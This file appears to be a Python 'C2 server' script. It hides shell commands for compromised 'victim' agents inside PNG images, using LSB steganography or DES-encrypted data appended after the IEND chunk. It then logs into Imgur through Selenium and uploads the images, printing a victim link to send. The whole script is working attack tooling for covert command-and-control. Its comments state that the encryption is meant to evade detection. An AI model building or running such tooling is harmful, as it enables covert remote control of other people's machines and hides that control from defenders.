from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import os,sys
import requests
import random
import string
import struct
import re
from Crypto.Cipher import DES
from PIL import Image
from imgurpython import ImgurClient

curr_aic_link = open('aic_link.txt','r').read()
curr_LSB_link = open('lsb_link.txt','r').read()
#Placeholder image yang akan dilakukan injeksi command
with open('kucing.png','rb') as x:
	f = x.read()

def upload_injected_image(client,types):
	album = None
	if types == "aic":
		gmbr = 'kucinglucu_aic.png'
	elif types == "lsb":
		gmbr = 'kucinglucu_lsb.png'
	else:
		print("Must be aic or lsb!")
		exit()
	json_chunk = {
		'album':album,
		'name':'Kucing '+types,
		'title':'Kochenk',
		'description':'Nope'
	}
	uploaded_image = client.upload_from_path(gmbr, config=json_chunk,anon=False)
	return uploaded_image

def tes_gambar(client):
	album = None
	gmbr = 'kucing.png'
	json_chunk = {
		'album':album,
		'name':'Kucing lucu banget kyk qamoeh',
		'title':'Kochenk',
		'description':'Nope'
	}
	test_image = client.upload_from_path(gmbr, config=json_chunk,anon=False)
	return test_image

def imgur_connect(param,cid,cs,iu,ip,cdr):
	clientId = cid
	clientSecret = cs
	client = ImgurClient(clientId,clientSecret)
	items = client.gallery()
	auth = client.get_auth_url('pin')
	driver = webdriver.Chrome(cdr) #change this
	username, password = iu, ip
	driver.get(auth)
	user = driver.find_element(By.XPATH,'//*[@id="username"]')
	pw = driver.find_element(By.XPATH,'//*[@id="password"]')
	user.send_keys(username)
	pw.send_keys(password)
	driver.find_element(By.NAME,"allow").click()
	try:
		ep = EC.presence_of_element_located((By.ID, 'pin'))
		WebDriverWait(driver, 10).until(ep)
		pin_element = driver.find_element(By.ID,'pin')
		pin = pin_element.get_attribute("value")
	except TimeoutException:
		print("Timed out")
	driver.close()
	creds = client.authorize(pin, 'pin')
	client.set_user_auth(creds['access_token'], creds['refresh_token'])
	print("Auth completed.")

	if param == "test":
		linking = tes_gambar(client)
		print(linking)
		print("Success! Victim link to be sent: "+linking['link'])
	elif param == "aic":
		linking = upload_injected_image(client,"aic")
		print(linking)
		print("Success! Victim AIC link to be sent: "+linking['link'])
		with open("aic_link.txt","a") as w:
			w.write(linking['link']+"\n")
			w.close()
	elif param == "lsb":
		linking = upload_injected_image(client,"lsb")
		print(linking)
		print("Success! Victim link to be sent: "+linking['link'])
		with open("lsb_link.txt","a") as w:
			w.write(linking['link']+"\n")
			w.close()

def maxbytes(f):
	#PNG header -> Magic Bytes + IHDR
	w = struct.unpack('>I',f[16:20])[0] #width 4 bytes, BIG ENDIAN
	h = struct.unpack('>I',f[20:24])[0] #height 4 bytes, BIG ENDIAN
	max_bytes = (w * h * 3) // 8 # (R,G,B) // sizeof(binary data)
	return max_bytes

def padding(command):
	while len(command) % 8 != 0: #DES prerequisites length
		command += b"~"
	return command

def LSBsetter(val,bit):
	if bit == '0':
		val = val & 254
	else:
		val = val | 1
	return val

def LSBprior(f,command,client_id,client_secret,imgur_username,imgur_password,chromedriverl):
	charset = string.printable + " "
	class zdict(dict):
		def __init__(self):
			self = dict()
		def add(self,key,value):
			self[key] = value
	dobj = zdict()
	
	for char in charset:
		dobj.key = char
		dobj.value = str(bin(ord(char))[2:])
		dobj.add(dobj.key,dobj.value)

	binary_msg = []
	for msg in command:
		binary_msg.append(dobj[msg])

	if os.path.exists('kucinglucu_lsb.png') == False:

		command += chr(0)
		c_image = Image.open('kucing.png')
		c_image = c_image.convert('RGBA')

		new_img = Image.new(c_image.mode,c_image.size)
		pixlist = list(c_image.getdata())
		new_arr = []

		for i in range(len(command)):
			cint = ord(command[i])
			cb = str(bin(cint))[2:].zfill(8)
			pix1 = pixlist[i*2]
			pix2 = pixlist[(i*2)+1]
			newpix1 = []
			newpix2 = []

			for j in range(0,4):
				newpix1.append(LSBsetter(pix1[j], cb[j]))
				newpix2.append(LSBsetter(pix2[j], cb[j+4]))
			new_arr.append(tuple(newpix1))
			new_arr.append(tuple(newpix2))
		new_arr.extend(pixlist[len(command)*2:])

		new_img.putdata(new_arr)
		new_img.save('kucinglucu_lsb.png','PNG')
		imgur_connect("lsb",client_id,client_secret,imgur_username,imgur_password,chromedriverl)
	else:
		print("Place holder exists! Removing ..., Rerun the script again!")
		os.remove('kucinglucu_lsb.png')


def IEND(f,command,client_id,client_secret,imgur_username,imgur_password,chromedriverl):
	#Untuk menghindari plain command terdeteksi, kita gunakan
	#enkripsi DES
	key = bytes.fromhex("1337371342694209")
	encc = DES.new(key, DES.MODE_ECB)
	padded_command = padding(command)
	appender = encc.encrypt(padded_command)

	if os.path.exists('kucinglucu_aic.png') == False:
		with open('kucinglucu_aic.png','wb') as r:
			r.write(f + appender)
			r.close()
		imgur_connect("aic",client_id,client_secret,imgur_username,imgur_password,chromedriverl)
	else:
		print("Place holder exists! Removing ..., Rerun the script again!")
		os.remove('kucinglucu_aic.png')
	#upload imgur
	exit()


#C2 Options
banner = '''
                                           _________  ________  
_____    ______ ____   ____    ____        \_   ___ \ \_____  \ 
\__  \  /  ___// __ \ /    \  / ___\       /    \  \/  /  ____/ 
 / __ \_\___ \\  ___/|   |  \/ /_/  >      \     \____/       \ 
(____  /____  >\___  >___|  /\___  /   _____\______  /\_______ \
     \/     \/     \/     \//_____/   /_____/      \/         \/

========== WELCOME TO (NOT SO) C2 SERVER  =====================
'''
print(banner)
print("Current Injected Image link with AIC Payload:")
print(curr_aic_link)
print("Current Injected Image link with LSB Payload:")
print(curr_LSB_link)
print("Need an IMGUR Auth first, please provide your client_id:")
client_id = input()
print("Next is Client secret:")
client_secret = input()
print("Enter your imgur username:")
imgur_username = input()
print("Enter your imgur password:")
imgur_password = input()
print("Locate your chromedriver.exe (absolute path only i.e D:\\chromedriver.exe)")
chromedriverl = input()
print("This script requires you to use chrome as default browser!")
print("The following C2 Medium will be used. Pick one:")
print("[1] PNG LSB-based C2 Command Injection")
print("[2] PNG After-IEND-Chunk Command Injection")
print("[3] Image Upload & Connect to Imgur Test (Dummy Beta Test)")
opt = input("> ")
print("Schedule the task command that you'd like to execute from Agent Client Victim: (ex -> whoami;pwd)")
command = input("> ")
if len(command) * 8 > maxbytes(f):
	print(f"Command cannot be more than {maxbytes(f)} bytes")
	exit()

if opt == '1':
	LSBprior(f,command,client_id,client_secret,imgur_username,imgur_password,chromedriverl)
elif opt == '2':
	IEND(f,command.encode(),client_id,client_secret,imgur_username,imgur_password,chromedriverl)
elif opt == '3':
	imgur_connect("test",client_id,client_secret,imgur_username,imgur_password,chromedriverl)	

else:
	print("Invalid opt. Exiting ...")
	exit()



# print("Next, retrieving response from Image. Procceed? [y/n]")
# opt_2 = input("> ")
# if opt_2 == 'y':
# 	pass
# 	#scan for image with IP Address name and its method + download
# else:
# 	exit()